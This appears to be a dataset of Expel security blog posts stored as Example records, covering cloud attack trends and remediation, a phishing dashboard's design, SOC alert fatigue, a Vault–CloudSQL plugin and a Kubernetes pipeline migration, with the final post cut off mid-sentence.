  Example({'title': 'Cloud attack trends: What you need to know and how ...', 'url': 'https://expel.com/blog/cloud-attack-trends-need-to-know/', 'date': 'May 25, 2021', 'contents': 'Subscribe  EXPEL BLOG Cloud attack trends: What you need to know and how to stay resilient Security operations  7 MIN READ  ANTHONY RANDAZZO  MAY 25, 2021  TAGS: Cloud security / MDR / Tech tools Well, 2020 is getting smaller in our rearview mirror as our journey into 2021 takes us closer to summer. Good riddance. Wed be remiss, though, if we didnt take some time to reflect on the things we observed and learned over the last year at Expel. So, we decided to take a close look at the cloud threat landscape. While we can easily get hung up on the black swan events of the year, we took a more data-driven approach to find the greatest threats to the majority of orgs today. At Expel, we view the cloud as any infrastructure, platforms or applications living in some data center that your org doesnt wholly manage. This might be your Amazon Web Services (AWS) or Microsoft Azure cloud infrastructure; an O365 or G Suite tenant; your GitHub repositories or perhaps the Okta instance that manages identity to all of your end users. During the COVID-19 pandemic, our SOC saw that bad actors wasted no time thinking of more evil ways to attack in the cloud and take advantage of people using phishing tactics. See full Top cybersecurity attack trend during COVID: Phishing infographic And the IC3s 2020 Internet Crime Report echoes our findings. Its disheartening to see that attackers used a crisis to their advantage to infiltrate cloud apps and increase their phishing efforts. But its also not surprising. Bad actors will continue to evolve their tactics, using health and economic crises to manipulate unsuspecting people into surrendering their credentials and other information. That doesnt mean hope is lost. There are ways to remediate and stay resilient against the inevitable attacks in your cloud and phishing ploys. Follow @amrandazz In this blog post, Ill cover the top three types of attacks we saw between March 2020 and March 2021, how to respond to an attack if it happens to you and share some steps you can take today to drastically reduce the chance of it happening to your business. Attack trend: Business email compromise If youve taken a look at our Top cybersecurity attack trend during COVID: Phishing infographic, youll know that business email compromise (BEC) is still public enemy number one. Here at Expel, the scale tips favorably toward BEC incidents in O365 versus G Suite. And theres one primary reason for that: O365 has some initial configurations that need to be changed by default, whereas G Suites settings out-of-the-box are pretty straightforward. We previously covered these configurations but heres the TL;DR: With original deployments of O365 tenants, IMAP and POP3 were enabled by default in O365 Exchange as well as BasicAuthentication . IMAP and POP3 dont support multi-factor authentication (MFA), so even if you have MFA enabled, attackers can still access these mailboxes. BasicAuthentication allows attackers to authenticate with clients past any pre-authentication checks to the Identity Provider which could lead to unwanted account compromises or account lockouts from password spray or brute force attacks. Microsoft intended on doing away with BasicAuthentication by default but has postponed this rollout due to the COVID-19 pandemic. This is now expected to rollout before the end of 2021. Google, on the other hand, disables these configurations in G Suite by default but allows them to be enabled ex post facto. Remediation What should you do if you identify someone that shouldnt be in your O365 Exchange? Fortunately, its pretty straightforward. Reset the users credentials; Review the mailbox audit logs to determine if any unsavory activity occurred; and Remove any mail forwarding rules (if applicable). Resilience There are quite a few things you can do to prevent these BECs from being commonplace in your cloud email. First and foremost, ensure that youre using MFA wherever possible. While its not a silver bullet, its absolutely critical in todays cloud-first environments. Our data infers that 35 percent of the BEC attempts weve spotted could have been prevented by enabling MFA. Next, disable legacy protocols such as IMAP and POP3. Again, these dont support any sort of Modern Authentication (Modern Auth) which means an attacker can bypass MFA completely by using an IMAP/POP3 client. Once those are turned off, strongly consider disabling BasicAuthentication to prevent any pre-auth headaches on your O365 tenants. Seven percent of BEC attempts could have been stopped by enforcing modern authentication. If youre still not sleeping well at night, then consider implementing some extra layers of conditional access for your riskier user base. You can even create a conditional access policy to require MFA registration from a location marked as a trusted network. This prevents an attacker from registering MFA from an untrusted network. Lastly, dont neglect your secure mail gateway. We recently helped a customer make some configuration changes that ultimately lead to a major drop in volume of phishing emails they received on a daily basis  reducing their BEC incident count. Attack trend: Cloud access providers If we remove the explicit BEC incidents, the next biggest target we see are cloud access identity providers like Okta or OneLogin. While some attackers might just want access to your email for fraud purposes, others have their eyes on a bigger prize: the data behind your applications. Many orgs already migrated to SSO (SAML) authentication, and this is especially the case in a post-2020 working environment where many employees work remotely. Which means that attackers can hit more than just mail providers as an easy target to harvest credentials. During 2020, we saw attacks on Okta quite a bit. So well focus our remediation recommendations there. So, how are all of these Okta accounts getting compromised? A couple ways. First, its entirely possible to intercept session tokens for Okta after MFA has been established. Weve talked about this tactic a bit in the past (and yes, U2F will prevent this). These session tokens can then be used to maintain access indefinitely depending on the refresh token and any limitations it might have. But theres an even simpler approach: hoping unsuspecting end users will click that push notification. You might be amazed at how frequently this occurs. And the results can be disastrous (we personally have over 50 published applications for certain users in Okta). Remediation Remediation after a confirmed Okta access compromise may be a bit more involved than a BEC limited to a single Exchange Online mailbox. Here are the high level tasks: Terminate the users active sessions to disrupt existing authenticated entities; Reset the compromised credentials; and Determine if an attacker accessed any published applications (hopefully not as this will require subsequent remediation and responses against those apps). We have a quick workflow here at Expel that will grab all of the associated SSO activity. Resilience Okta, in particular, has a feature called Adaptive MFA which creates behavioral profiles of each of your users and introduces a little bit of friction when an anomalous login occurs. This friction might be the difference between a compromise or not. If youre running sensitive applications in Okta, then you might consider applying application-level MFA . Lastly, while we have become more distributed in a post-pandemic world, you might also consider implementing Network Zones to effectively develop an allow list for access in your sign-on policies. Cloud attack trend: Cloud infrastructure When we started theorizing where to focus detection efforts in cloud infrastructure, it was apparent that most risk lied on access within the control (management) planes. It turns out that attackers are, in fact, interested in this sort of access . Excessive access to the control plane opens organizations up to a bunch of problems and the reality is that all of the shift left security in the world doesnt prevent the use of compromised credentials. We know this access may be for financial gain or perhaps even persistent access . The good news is that there are a variety of ways to prevent this. Remediation Cloud infrastructure response can have a bit of variance given that they each have completely different Identity and Authentication Management (IAM) implementations. In AWS, its a little more straightforward. Identify all compromised access keys. Some exposed or compromised access keys may happen en masse so its best to make sure youve found them all. This can be done by pivoting based on the attacker access indicators such as IP address. Snapshot and remove any new infrastructure created by the attackers. Determine if any data plane access occurred (i.e. SSH access to your EC2) and respond as necessary. Resilience Inadvertently exposed secrets can exacerbate this problem so its important to to get a hold over your public git repositories. There are commercially available products to identify exposed secrets such as GitGuardian , or you can go at it yourself and use open source projects like truffleHog . The good news is that repositories like GitHub delay the public API by five minutes to give organizations a head start to remediate these sorts of exposures. Another thing to think about is subscribing to AWS Security Hub to develop your own use-cases for automated incident response , or again, you can run at this alone via custom Lambda, CloudWatch or even your own SOAR platform. Another great AWS Organizations feature: develop least privilege access control with Service Control Policies to limit the blast radius of compromised credentials. New attacks. New resources. So whats in store for us for the rest of 2021? Well, we wish we had a crystal ball to say for sure but we can make some pretty educated guesses based on what we saw over the last 12 to 18 months. Events like the SolarWinds breach reminded us that the cloud is absolutely a target (golden SAML in Azure) and that we need to stay diligent  and prepare for what might be around the corner. While attacks in the cloud and phishing arent new, we know that bad actors will continue to get creative. And one thing is for sure: well continue to see BEC attacks at the same volume or even increase this year. Microsoft will hopefully roll out their more proactive controls such as deprecated support for BasicAuthentication for Azure Active Directory (AzureAD) in 2021. Although, it seems like its going to be at least a year before that comes to fruition for orgs that have mail clients actually using those authentication protocols with Exchange Online. Fortunately, well continue to see the development of resources and services that address new and changing security needs. At Expel, weve been working on providing new products and services to help our existing and new customers endure the onslaught of 2020, and the new challenges it presented. When our customers let us know that they were drowning in phishing emails, we created the Expel Managed Phishing Service . So, in addition to our analyst providing 247 managed security, theyll also have eyes on every single email someone at your org reports as a potential phishing attempt. While we cant stop attackers from being cunning, we can use our expertise (as a community) to help each other not only keep our heads above water but also prevent getting blindsided again. Check out Expel Managed Phishing'}) (input_keys={'title'}),
  Example({'title': 'Cloud security Archives', 'url': 'https://expel.com/blog/resource_topic/cloud-security/', 'date': None, 'contents': None}) (input_keys={'title'}),
  Example({'title': 'Come sea how we tackle phishing', 'url': 'https://expel.com/blog/expel-phishing-dashboard/', 'date': 'Jun 8, 2021', 'contents': 'Subscribe  EXPEL BLOG Come sea how we tackle phishing: Expels Phishing dashboard Security operations  7 MIN READ  KELLY NAKAWATASE  JUN 8, 2021  TAGS: Phishing / Tech tools Its tough to stay afloat when youre drowning in phishing emails. While its great that users are submitting suspicious-looking emails, you need to be able to glean meaningful information from all the data in those suspicious submissions. But how? And with what time? Our crew wanted to find a way to quickly show our Expel managed phishing service customers helpful data like who is attacking them, how often theyre being attacked and whether or not their phishing training program is effective. Lets connect And this is where I come in. (Hi, Im Kelly, one of Expels senior UX designers. I designed the Phishing dashboard.) In this post, Im going to talk (type?) you through the UX process that went on behind the scenes in creating the Expel Phishing dashboard  from figuring out which metrics would be the most useful for our customers to determining the right visualization for any given set of data. If youre developing a measurement framework for your own phishing program  or are just interested in learning how I created a dashboard centered on the goals of our users  youll want to keep reading. Whale, what does the Expel managed phishing service do? Perfect meme, courtesy of the internet TL;DR: We triage and investigate the emails customers of our managed phishing service report as potential phishing. At its base, users submit suspicious looking emails to us so our SOC analysts can triage the email and determine whether or not the submission is benign or malicious. If the email is deemed malicious, our analysts do the legwork to figure out if there was an actual compromise, and if there was a compromise, we inform you and provide instructions to remediate the situation. If the email had malicious intent but users didnt fall for it, then our analysts conclude their investigation and offer recommendations to help improve overall security to ensure no one does fall for it in the future. Casting a net for goals I joined the phishing team in its infancy, and as a UX designer here at Expel, my job is to ensure that we keep our customers goals top of mind when we create products. So, I started by asking questions: Whats the purpose of this dashboard? What would customers be most interested in seeing on the dashboard? How often would they use it? How would they use it? Also a lot more questions. I talked to a few of our phishing proof of concept customers to get answers to these questions. I also talked to a few of our Engagement Managers (EMs), who are very in tune with what customers as a whole are generally trying to accomplish. These conversations helped me discover what our customers wanted to be able to do with their phishing programs, what holes they saw in other services. After a number of informational interviews, I formed four goals for the Phishing dashboard. Help customers report up to their executives on the state of phishing at their organization. Help train users who report the most false positives, and reward users who are great at catching phish! Identify oppor-tuna-ties to improve overall security and prevent future phishing. Show customers what they can expect to see. Its likely that if theyre interested in our phishing service, theyve used other phishing-related apps to bulk up their program. If theyre used to getting certain kinds of metrics around phishing, I wanted to make sure that the first iteration of our Phishing dashboard met that baseline at the very least so customers would never feel like theyre lacking by just working with us. Deep diving for metrics I wanted to see what other products in the phishing space were doing when it comes to serving metrics, in order to design effectively. So, I looked at the ocean of phishing apps and software, combed through public product documentation and YouTube videos, and took inventory of all the metrics these products were showing on their dashboards and reporting. I compared these metrics to the ones we were already collecting for our proof of concept customers. Before I condensed this list and got rid of the duplicates, there were 132 data points. But, like I said, that was before getting rid of duplicates. And there were actually a lot of duplicates. So, I did the classic UX method of a good ol analog card sort. Basically, I wrote every single metric (even the duplicates) onto a Post-It Note and grouped them by category. I did this a few times to get different kinds of groups. Then I grouped these metrics based on the goals I mentioned above. Photo of my analog card sort and my shadow self These were some of the metric categories I came up with. But its actually not my opinion that matters the most here. Remember, our customers are the ones I have to keep in mind when designing. After condensing the list of metrics down to a manageable number, I was able to run an unmoderated, completely remote card sort with a customer and EMs to see how theyd use these metrics, and if there were any metrics they thought were unnecessary or missing. Im proud to say that the categories these users came up with were quite similar to my own. Reeling it in for feasibility and tackling visualizations Once I had a shorter list of metrics and categories that would meet the goals for the Phishing dashboard, I knew Id have to reel it in based on time and technical feasibility. So, I met with the phishing engineers to discuss which items on the metrics list were realistic for a first version, and which metrics wed have to revisit for a later version. I let go of more complicated metrics like susceptibility by department and phish category (its bookmarked for a future version though maybe dont quote me ). But capturing key baseline metrics  being able to collect data and list out most common subjects, attachments, users and user accuracy  was definitely feasible. The next step was figuring out how to most effectively visualize these metrics. I looked at popular dashboard designs, aesthetically pleasing dashboards and whatever showed up in best dashboards searches. I blocked out their visualizations to understand ideal page layout, the kinds of metrics and visualizations that got prioritized, and what kind of visual weight is given to any particular graph. You cant really just take a metric category and throw it into a pie chart and call it done. So much of good design in dashboards is finding the right visualization for the right group of metrics to tell the story that your users need. For example, a group of metrics I knew we needed to show were: Total user submissions for a given timeframe, How many of those submissions were malicious; and How many of those submissions were benign. It seemed like the most obvious visualization for this group would be to put it in a pie chart that shows the quantities in each metrics group and how they make up the whole of total submissions. Or maybe the most obvious visualization is to just show the raw counts of these numbers, or in a funnel, like our Workbench Alerts Analysis Dashboard funnel. Example of straight counts, and adapting these metrics into graphics on our Workbench Alerts Analysis Dashboard But in talking to customers, I already knew that the straight quantity of submissions and their subsequent outcomes wasnt the interesting part of this data. In fact, showing straight quantities for this might be the least informative way of expressing this data. The story is whats important here. Below is what ended up being the final version of this data visualization, and it offers so much more information than a pie chart could. Customers are more interested in looking at how the outcomes of their suspicious emails trend, and whether or not theres a spike. If theres a spike, then you can investigate why there was a spike. You can interact with the legend to turn on and off certain outcomes, compare the lines and easily screenshot this for reports. Example of Expel Phishing Dashboard line graph Once I did this for all of the metric groupings that would appear on the Phishing dashboard, I laid it out and started chumming for feedback from current customers. And, wahoo! The feedback was largely positive, and I made some adjustments to wording and changes to which graphs got to be the principal in the school of visualizations. All aboard the Phishing dashboard tour Lets walk through the Expel Phishing dashboard 1.0. Reminder: if youre already an Expel customer, dont be koi, you can preview and interact with this krill-iant dashboard in Workbench! The image below shows submissions by outcome over time, which is what customers first look for upon landing here. You can look for spikes and trends in the data. On the right, we have some information on malicious senders and how many emails are sent per sender. We also have the number of unique submitters so customers can see how many of their users are reporting emails as potentially phishy. This can be an indicator for how effective training or end user education is. Expel Phishing Dashboard top level metrics of submissions over time and unique senders and submitters Moving down the dashboard, second level on the left, we have a horizontal bar chart. This gives customers information about how many submissions were receiving from their users, and how many of those submissions turn into actual security incidents. On the right, we have information on the frequent submitters of malicious, benign, and all email submissions to give customers insight into which users may need more training. Metrics displaying how submissions funnel down to incidents, and submitter leaderboards In the next image, on the third level on the left, we show customers the kinds of attachments that show up in malicious emails. This helps customers create custom rules in their secure email gateway (SEG) to limit similar incoming emails. On the right is how often we use customer integrated technology to assist in our phishing investigations. This is to give customers an idea of their return on investment in their security vendors. Information on malicious attachment quantity and how often our analysts leverage your tech in phishing investigations Lastly, along the same vein as malicious attachments, we have frequent domains, senders and sender domains. This can help customers not only create rules in their SEG to limit incoming emails, but can also help them see if theres a themed campaign against their org. The final metrics on the Phishing dashboard provide information about recurring themes in malicious emails Hook, line, and sinker Of course, thats not the end of my job, or the end of the Phishing dashboard. After all, this is only version one. Birds eye view of the primary Phishing dashboard mockup The Expel Phishing dashboard is on its maiden voyage, and I hope you enjoyed swimming alongside me. Im excited to be on this journey with our Expel managed phishing customers and the rest of the Expel crew. Want to see where we take the dashboard next? Hop aboard!'}) (input_keys={'title'}),
  Example({'title': 'Companies with 250-1000 employees suffer high security ...', 'url': 'https://expel.com/blog/companies-with-250-1000-employees-suffer-high-security-alert-fatigue/', 'date': 'May 2, 2023', 'contents': 'Subscribe  EXPEL BLOG Companies with 250-1,000 employees suffer high security alert fatigue Security operations  3 MIN READ  CHRIS WAYNFORTH  MAY 2, 2023  TAGS: Careers / MDR In our recent report on cybersecurity in the United Kingdom (UK) , IT decision-makers (ITDMs) point to a corrosive dynamic threatening the effectiveness of their security operations centres (SOCs) and the well-being of their security and IT teams. In sum, fatigue stemming in large part from a barrage of alerts and false positives is disrupting workers private lives, driving burnout and staff turnover at a time when theres a critical talent shortage in the industry. The effect is evident across the board, but companies with 250-1,000 employees (what Expel calls the commercial segment) are being hit especially hard. Lets review the findings and consider possible reasons why the 250/1k segment is suffering so badly. Regardless of these findings, we believe theres hope. At the end, well discuss strategies to help businesses not only survive, but thrive in this environment. Fatigue and burnout is worst for companies with 250-1,000 employees More than half of ITDMs say their SOCs spend too much time on alerts , with larger companies (250+) more likely to call it out as a particular concern. (Problem alerts include low-risk/low priority notifications and false positives.) Respondents in the 250/1k segment were most likely to say their teams spend too much time addressing alerts (60%). This segment also views the issue as more urgent, with a quarter saying they strongly agree. ITDMs in the 250/1k segment are also significantly more likely to cite alert fatigue as a problem for their security teams. The risk associated with fatigue is huge. As we noted in the UK report, an International Data Corporation (IDC) study found that a dizzying number of alerts are ignored27% among companies with 500-1,499 employees (which includes a big chunk of the segment were examining here). This revelationthat more than a quarter of threat alerts hitting the SOC are being ignoredshould keep leaders and board members awake all night, every night. Alert fatigue and the 3CX hack In the recent 3CX attack, many of the platforms users had seen their endpoint protection software incorrectly flag known, good software as malicious in the past. Since 3CXs software was expected in their environment, many analysts assumed the endpoint protection software was incorrect, rather than suspecting the software had been the victim of a supply chain attack.  Greg Notch, Chief Information Security Officer, Expel Alert fatigue and burnout: the human toll Alert overload, alongside all the other challenges associated with running a 24/7 SOC (during an era plagued by a 3.4 million-person talent shortage ), represents an unsustainable infringement on security pros personal lives. Ninety-three percent of ITDMs surveyed (and 95% in the 250/1k category) say their personal commitments are at least occasionally cancelled, delayed or interrupted because of work. But, as chart 3 indicates, the 250/1k group is affected significantly more often51% of respondents say it happens all or most of the time, a stunning 15% more than the next highest segment. Unsurprisingly, then, ITDMs in this key segment say their groups experience substantially higher degrees of burnout 14% higher than the ITDM total. Staff turnover The upshot here is that burned-out workers make mistakes (like the missed alerts that happened in the 3CX supply chain attack) or leave (perhaps both). The potential for attrition is especially distressing, given the talent deficit noted above. Again, companies in the 250-1,000 employee range feel the crush worse than those in other segments. This cohort feels a greater intensity on this measure than other respondents. Its 27% positive response is eight points higher than the all-segment average. Why are companies with 250-1,000 employees having a harder time than other segments? Greg Notch, Expels chief Information security officer (CISO), says these companies are big enough to have big company problems, but lack the structure and funding to build a security program sufficient to defend their enterprise. The folks trying to keep those programs afloat are understaffed, so theyre naturally burning out. Also, because theyre stuck doing repetitive work just to keep the lights on, its preventing their career growth into more strategic roles. So they leave to find those opportunities elsewhere. And its easy for them to do that because of the talent shortage. He also says it doesnt help that ransomware targeting is now going wider and down-market. As a result, these folks are in live-fire situations with bad business outcomes. The UK security report makes a couple of things clear. First, SOCs are under tremendous stress as they try to safeguard their organisations, and if CISOs and their teams feel overwhelmed the data illustrates why. Second, the pressure is substantially worse for IT/security teams in organisations with 250-1,000 employees. And now, the good news Given the dramatic worldwide talent shortage, its nave to imagine that all organizations can find and afford the people needed to build and run their own SOCs. Managed detection and response (MDR) addresses these problems. MDRs are fully-managed, 24/7 services staffed by experts who specialise in detecting and responding to a wide range of cyberattacks, including phishing, ransomware, and threat hunting. By marrying human expertise to advanced technologies, MDR analysts can detect, investigate, neutralise, and remediate advanced attacks. This eliminates an organisations need for a large staff. The best MDRs relentlessly research the latest hacker tactics and develop advanced tools to process massive amounts of data and automatically sort signal from noisemeaning a companys analysts see the important alerts, not all the alerts. The list of benefits goes on, but the bottom line is that, for many organisations, MDR means broader, deeper, more sophisticated cyberdefense (and fewer headaches) for less money. If any of this sounds relevant for your business, we encourage you to review the full report and drop us a line .'}) (input_keys={'title'}),
  Example({'title': "Connect Hashicorp Vault and Google's CloudSQL databases", 'url': 'https://expel.com/blog/connect-hashicorp-vault-and-googles-cloudsql-databases-new-plugin/', 'date': 'Aug 31, 2022', 'contents': 'Subscribe  EXPEL BLOG Connect Hashicorp Vault and Googles CloudSQL databases: new plugin! Engineering  3 MIN READ  DAVID MONTOYA AND ISMAIL AHMAD  AUG 31, 2022  TAGS: Cloud security / Tech tools We take protecting credentials seriously, and database (DB) credentials are no exception. Theyre juicy targets for attackers and often hold the keys to all your sensitive information. Making sure theyre short-lived, rotated, scoped, auditable, and aligned with zero trust principles is central to boosting an organizations security posture. As you may know from our previous post, 5 best practices to get to production readiness with Hashicorp Vault in Kubernetes , were long-time users of Vault, which specializes in credential management and offers a large plugin ecosystem for different databases. Sounds like a slam dunk right? Not so fast. As we began to explore using Vault to manage credentials for our Google-managed CloudSQL instances, we found ourselves stuck between two less-than-ideal out-of-the-box options, forcing us to compromise on operational complexity or, worse, security. Caught between a rock and a hard place, we dug deeper and built a new tool to meet our requirements. We think its broadly useful for organizations using Vault and Google CloudSQL. And now, the good news: Expel is excited to open source a new Hashicorp Vault plugin. It brokers database credentials between Hashicorp Vault and Googles CloudSQL DBs and it doesnt require direct database access (via authorized networks ) or that you run Googles CloudSQL auth proxy. If youre wondering how thats possible, the plugin uses Googles best practice for authentication via IAM rather than a standard database protocol. Sound like something you could use? The plugin codebase can be found in GitHub . Why build a custom plugin? To better understand why we built this plugin, lets look at some of the challenges posed by using Vaults default database plugins to connect to CloudSQL instances. Per Googles documentation , there are two primary ways of authorizing database connections. Option 1: use CloudSQL authorized networks Google allows users to connect to CloudSQL databases using network-based authentication. To improve the security posture of your DB, Google recommends enabling SSL/TLS to add a layer of security. This requires users to manage an allowlist of IP CIDRs and SSL certificates on both the servers and clients for the databases they wish to connect to. As you can see, this gets tedious quickly. Imagine you have hundreds of CloudSQL databases no one wants to manage that many firewall rules or certificates. Option 2: use CloudSQL Auth proxy Googles recommended approach for connecting to CloudSQL instances is to use the Auth proxy . Its benefits include: Uses IAM authorization instead of network-based access control (no more firewall rules!) Automatically wraps all DB connections with TLS 1.3 encryption regardless of the database protocol As we started exploring approaches for connecting our Vault instances to CloudSQL databases, we contemplated using the cloudsql-proxy (but shuddered at the operational complexity of running such a specialized sidecar along with our Vault servers). Developing a Hashicorp Vault plugin So, how exactly did we end up writing our own Vault plugin? As we researched options, we landed on a GitHub issue that referenced an interesting new Go connector for CloudSQL . The Google Cloud team had recently released a generalized Go library for authenticating to CloudSQL databases the same way that their auth proxy does. Being Go developers, our interest really piquedcould we use this new library to get the best of both worlds (low operational complexity and security best practice)? By creating a new Vault plugin based on Googles Go connector, we were able to integrate Vault with CloudSQL databases all while taking advantage of Vaults existing capability to create and manage database credentials. The plugin simply initiates the database connection using the new Go connector for CloudSQL instances and then delegates everything else to the community-supported Vault database plugin. How to use it Ok so youve made it this far. You understand what problem the plugin is solving and how its solving it. Now lets talk about how you use it. A step-by-step guide to building and deploying this plugin can be found here . Conclusion Although building a new way often seems daunting, our journey with Vault and CloudSQL was rewarding and we hope our plugin will be useful to others facing similar issues. As we continue our journey, watch this space for future posts describing how to employ Vault as a database credential broker for workloads and audit across the stack. Finally, have a look: weve posted a step-by-step guide on GitHub detailing how to set this up in your environment.'}) (input_keys={'title'}),
  Example({'title': 'Containerizing key pipeline with zero downtime', 'url': 'https://expel.com/blog/containerizing-key-pipeline-with-zero-downtime/', 'date': 'Feb 23, 2021', 'contents': 'Subscribe  EXPEL BLOG Containerizing key pipeline with zero downtime Engineering  8 MIN READ  DAVID BLEWETT  FEB 23, 2021  TAGS: Cloud security / MDR / Tech tools Running a 247 managed detection and response (MDR) service means you dont have the luxury of scheduling downtime to upgrade or test pieces of critical infrastructure. If that doesnt sound challenging enough, we recently realized we needed to make some structural changes to one the most important components of our infrastructure  Expels data pipeline, and the processing of that data pipeline. Our mission was to migrate from a virtual machine (VM)-based deployment to a container-based deployment. With zero downtime. Lets connect How did we pull it off? Im going to tell you in this blog post. (Hi, Im David, Expels principal software engineer.) If youre interested in learning how to combine Kubernetes, feature flags and metric-driven deployments, keep reading. Background: Josie and the Expel Workbench In the past year at Expel, weve migrated to Kubernetes as our core engineering platform (AKA the thing that enables us to run the Expel Workbench). Whats the Expel Workbench? Its the platform we built so that our analysts can quickly get all the info they need about an alert and make quick decisions on what action to take next. In addition to some other very cool things. Want to see it in action? Get a free two-week trial of Expel Workbench for AWS Back to Kubernetes. While known for its complexity (who here likes YAML?), Kubernetes comes with a large amount of functionality that can, if used correctly, result in elegant solutions. Full disclosure: Im not going to dive into all the things we do with Kubernetes, or what is Kubernetes for that matter. Instead, Im going to focus specifically on our data pipeline and detection engine (we call her Josie). Our detection pipeline receives events (or logs) and alerts from our customers devices and cloud environments. Then, our detection engine processes each alert and decides what to do with it. We have some fundamental beliefs about detection content and our pipeline: Never lose an alert; Quality and scale arent mutually exclusive; The best ideas come from those closest to the problem; and Engineering builds frameworks for others to supply content. This means our detection pipeline is content-driven and can be updated by our SOC analysts here at Expel. We also hold the opinion that content should never take a framework down. If it does, thats on engineering, not the content authors. With these beliefs in mind, we were faced with the challenge of making structural changes to how we are running our detection engine, ensuring quality, not losing alerts and still enabling analysts to drive the content. Josies journey to Kubernetes What we knew Ensuring this migration didnt disrupt the daily workflow of the SOC was key. Just as important was not polluting metrics used for tracking the performance of the SOC. Thats why we wanted an iterative process. We wanted to run both pipelines in parallel and compare all the performance metrics and output to ensure parity. We also knew we wanted to be able to dynamically route traffic between pipelines, without the need for code-level changes requiring a build and deploy cycle. This would allow us to atomically re-route and have that change effective as quickly as possible. The final requirement was to retain the automated delivery of rule content. While the existing mechanism was error-prone, we didnt want to take a step backward here. Tech we chose We were already moving our production infrastructure to Kubernetes. So we took full advantage of several primitives in Kubernetes, including Deployments , ConfigMaps and controllers . We chose LaunchDarkly as a feature flag platform to solve both the testing in production and routing requirements. Their user interface (UI) is the icing on the cake  tracking changes in feature flag configuration as well as tracking flag usage over time. The real-time messaging built into their software development kit (SDK) enabled us to propagate flag changes on the order of hundreds of milliseconds. Preparing Josie for her journey If youve read our other blogs, youll know that Expel is data-driven when it comes to decision making. We rely on dashboards and monitors in DataDog to keep track of whats happening in our running systems on a real-time basis. Introducing a parallel pipeline carries the risk of polluting dashboards by artificially inflating counts. To mitigate this, we added tags to our custom metrics in DataDog . After the new tag was populated by the existing pipeline, we added a simple template variable , defaulting to filter to the current rule engine. This ensured that existing users view of the world was scoped to the original engine. It also enabled the team to compare performance between the parallel pipelines in a very granular way. We then updated monitors to include the new tag, so they alerted separately from the old engine. The next step was to add gates to the application that would allow us to dynamically shift traffic between rule engines. To do this, we created two feature flags in LaunchDarkly: one to control data that is allowed into a rule engine and one to control what is output by each engine. Finally, we set up a custom targeting rule that considered the customer and the rule engine name. Initial: Kubernetes Once the instrumentation and feature flags were functional, we began setting up the necessary building blocks in Kubernetes. When setting up pipelines, I try to get all the pieces connected first and then iterate through the process of adding the necessary functionality. So, we set up a Deployment in Kubernetes. A Deployment encapsulates all of the necessary configuration to run a container. To simplify the initial setup, we had the application connect to the Detections API service on startup to retrieve detection content. This microservice abstracts our detection-content-as-code, giving programmatic access to the current tip of the main branch of development. Note that we configured the LaunchDarkly feature flags before turning on the deployment. The first flag controlled whether or not this instance of the detection engine would process an incoming event from Kafka. This flag allowed us to start with a trickle of data in the new environment, and gradually ramp up the volume to test processing load in Kubernetes. The second flag controlled whether this version of Josie would publish the results of the analysts rules to the Expel Workbench. This allowed us to work through potential issues encountered while getting the application to function in the new environment, without fear of breaking the live pipeline and polluting analyst workflow. You can see the diagram I created to help visualize the workflow below. LaunchDarkly feature flags control flow Load Testing Once the new Deployment was functional inside Kubernetes, we began a round of load testing. This was critical to understand the base performance differences between the execution environments. We performed the load testing by first enabling ingress for all data into the new detection engine, but kept egress turned off. We then rewound the applications offset in Kafka. The data arrived in the rule engine and performed processing, but any output would be dropped on the floor. The processing generated the same level of metric data that the live system did, so we could compare key metrics such as overall evaluation time, CPU usage and memory usage. LaunchDarkly feature flags control flow Output Validation While we iterated through the load test, we also tested the data that was output by the new system. We pulled this off by tweaking the feature flag targeting rule to allow egress for the new detection engine for a specific customer. We chose an internal customer so that we could see the output in the Expel Workbench, but not disrupt our analysts. We triggered alerts for this customer then checked to see if each alert was duplicated, and if the content of each duplicated alert was identical. LaunchDarkly feature flags control flow Rule Delivery Once we were sure the new execution environment was capable of processing the load as well as generating the same output, we began to tackle the thorny problem of how to deliver the rule content. At Expel, our belief in infrastructure-as-code extends to the rules our SOC analysts write to detect malicious activity. The detection content is managed in GitHub, where changes go through a pull request and review cycle. Each detection has unit tests that run through CircleCI on every commit. Getting detection content from GitHub to the execution environment is tricky. The body of rules is constantly changing, and the running rule engine needs to respond to those changes as quickly as possible. Previously, when a pull request was merged, delivering the updated rule content involved kicking off an Ansible job that would perform a series of operations in the VM, and then restart processes to pick up the change. The entire process from pull request merge to going live could take as long as 15 minutes. Not only that, there wasnt much visibility into when those operations failed. Thats when we asked: Could Kubernetes help us improve this process? The team wasnt happy with the direct network connection on startup behavior, mainly because it introduced a point of failure and rule changes werent captured after startup. After talking with our site reliability engineering (SRE) team, we decided that the Detections API should store a copy of the rules content in a Kubernetes configmap. We then updated the Kubernetes Deployment to read the ConfigMap contents on startup. This decoupled the application from the network so that service failures in Detections API would not break the rule engine. But this introduced the possibility of a few other failure modes. If the saved rule content was not getting updated correctly, the running engine could be stuck running stale versions of the rule definitions. One possible cause of this is the size limit on ConfigMaps. Fortunately, addressing these possible failure modes was fairly straight forward. We used monitors in DataDog. We made use of a reloader controller to react to changes in the ConfigMap. This controller listens for changes in the ConfigMap and triggers an update to the Deployment. When Kubernetes sees this change in the Deployment, it initiates a rolling update . This process ensures that the new pods start successfully, then spins down the old pods. With both of these changes in place, we arrived at a solution that simplified the operation of the system and allowed it to react to changes in rule content faster than the original implementation. Below is a diagram of the entire process. Expel containerized rule engine Live Migration With the new Deployment performing well and responding to rule changes, we were ready to shift live processing from the old system to the new. We decided to do a phased rollout. We started with a small subset of our customer base, turning egress off in the old implementation and on in the new. We allowed the system to run for a couple of days, and then slowly increased the number of customers routing to the new system. After a few more days, we shifted all customer egress to the new pipeline and turned off egress on the old one. We kept the old system running in parallel so that if we encountered any discrepancies or problems, we could easily flip back to it. After letting both run in parallel for a week, we decommissioned the legacy VM system. LaunchDarkly feature flags control flow What this means for developers Large-scale change to a critical business component is a daunting task. Throughout the process, we made sure to keep both the SOC and leadership in the loop. Youve probably seen us mention the importance of communication a few times. Regular communication during each phase, especially the planning phases, was critical. We needed to learn about the key dashboards and monitors in play. This also helped us mitigate the risk of having to answer to an angry SOC. Here are some tips based the lessons we learned along the way: LaunchDarkly provides a rich set of feature flags. While it provides a richer feature set than what we took advantage of, we were able to deploy code live but control execution at a very granular level through the use of feature flags. Our main goal here was to know in advance which subset of customers would be processed by which engine so that their associated engagement managers could be prepared for questions. Adopt observability. Our investment in being driven by metrics paid dividends here. The existing DataDog dashboards were comprehensive and we easily compared both systems simultaneously. We also leveraged the existing corpus of monitors by adjusting their targets to take an additional label into account. Dont overlook the primitives available in Kubernetes. They gave us the flexibility to respond to content changes at a much faster pace, and with greater visibility. While Kubernetes does support live reloading of configmap content, the current iteration of the engine doesnt take advantage of it. Our plan was to dynamically reload rule content in the running pod, 